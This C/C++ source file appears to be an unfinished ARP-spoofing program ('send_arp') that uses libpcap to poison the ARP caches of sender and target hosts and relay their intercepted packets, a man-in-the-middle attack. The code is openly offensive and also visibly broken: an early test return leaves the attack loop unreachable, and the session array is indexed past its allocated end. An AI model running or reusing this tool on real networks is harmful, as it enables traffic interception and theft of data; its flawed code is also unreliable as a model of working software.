#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

//for inet_addr()
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//multithreading()
#include <pthread.h>

#include "packetheader.h"


int main(int argc, char *argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */

	u_char *send;
	int sender,target;
	char filestr[256];
	FILE* file;
	char myIPstr[16];
	char myMAC[6];
	int temp;

	unsigned int session_num;
	Attack_session** session_list;
	
	if(argc < 4 or argc%2 == 1){ 
		printf("usasge: ./send_arp [device] [sender ip] [target ip] ([sender ip] [target ip])\n");
		return(2);
	}

	dev = argv[1];
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	printf("getting from device - %s\n",dev);
	if( getmyMAC(myMAC,dev) != 1 ){
		printf("failed to find device MAC address\n");
		return(2);
	}
	if( !(getmyIP(myIPstr,dev)) ){
		printf("failed to find device IPv4 address\n");
		return(2);
	}
	printf("myIP : %s , myMAC : ",myIPstr);
	for(int i=0;i<6;i++)
		printf("%02X%c",(unsigned char)myMAC[i], i<5? ':' : '\n');

	/* Open the session in non-promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	session_num = (argc-2) >> 1; // (argc-2)/2;
	session_list = (Attack_session**) malloc( sizeof(Attack_session*) * session_num );

	for(int i=1 ; i <= session_num ; i++){
		session_list[i] = new Attack_session( (uint8_t*)argv[i*2], (uint8_t*)argv[i*2+1], (uint8_t*)myIPstr, (uint8_t*)myMAC);
		printf("session%02d ",i);
		session_list[i]->print_me();
	}


	send=(u_char*)malloc(65536);
	return(1); //test until here
	for(int i=0 ; i < session_num ; i++){
		session_list[i]->send_true_request((char*)send,1);
		if(pcap_sendpacket(handle,send,42) != 0)
			printf("session%02d :failed to send normal request to sender",i+1);
		session_list[i]->send_true_request((char*)send,2);
		if(pcap_sendpacket(handle,send,42) != 0)
			printf("session%02d :failed to send normal request to target",i+1);
	}
	while(1){
		/* Grab a packet */
		switch(pcap_next_ex(handle,&header,&packet)){
			case 1:
				for(int i=0 ; i < session_num ; i++){
					if( session_list[i]->recv_true_reply((char*)packet) );
					if( session_list[i]->is_ready() == 0) continue;
					if( session_list[i]->is_ready() == 1){
						session_list[i]->send_false_request((char*)send);
						pcap_sendpacket(handle,send,42);
					}
					if( session_list[i]->recv_request((char*)send,(char*)packet) ){
						pcap_sendpacket(handle,send,42);
					}
					if( session_list[i]->chk_relay_condition((char*)packet) ){
						session_list[i]->make_relay_packet((char*)send,(char*)packet,header->len);
						pcap_sendpacket(handle,send,header->len);
					}
					
					
				}
				/*
				if( arp_spoof((char*)send, (char*)packet, sender, target, myMAC) == 1){
					printf("catched request, sending reply\n");
					if (pcap_sendpacket(handle, send, 42) != 0){
						fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
					}
					else{
						for(temp=0;temp<10;temp++)
							pcap_sendpacket(handle, send, 42);
					}
				}
				*/
				break;
			case 0:
				break;
			case -1:
				printf("error occurred\n");
				free(send);
				for(int i=1 ; i <= session_num ; i++) delete session_list[i];
				return(2);
				break;
			case -2:
				printf("end of file\n");
				free(send);
				for(int i=1 ; i <= session_num ; i++) delete session_list[i];
				return(2);
				break;
		}
	}
	/* And close the session */
	pcap_close(handle);
	free(send);
	for(int i=1 ; i <= session_num ; i++) delete session_list[i];
	return(0);
}
